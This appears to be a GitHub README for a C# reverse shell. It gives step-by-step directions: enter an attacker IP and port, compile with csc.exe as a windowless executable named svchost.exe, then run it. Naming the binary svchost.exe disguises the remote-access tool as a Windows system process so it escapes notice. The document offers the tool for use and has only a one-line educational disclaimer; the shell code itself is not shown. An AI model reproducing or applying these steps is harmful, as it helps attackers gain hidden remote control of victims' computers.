# dot-net-simple-reverse-shell
Just a simple reverse shell in cs.

---

## 1. Edit the .cs file
Edit the file with your IP and PORT.

## 2. Compiling the .cs file
Use 

*"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:winexe /platform:x64 /optimize+ /nologo /debug- /out:svchost.exe revshell.cs"* 

or 

*"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:winexe /platform:x64 /optimize+ /nologo /debug- /out:svchost.exe revshell.cs"* to compile.

## 3. Running the generated .exe file 

Once the executable is created, use *".\svchost.exe"* to running it.

---

Testing dot net simple reverse shell


# Disclaimer
*The projects was created for educational purposes only.*

Bye! o/
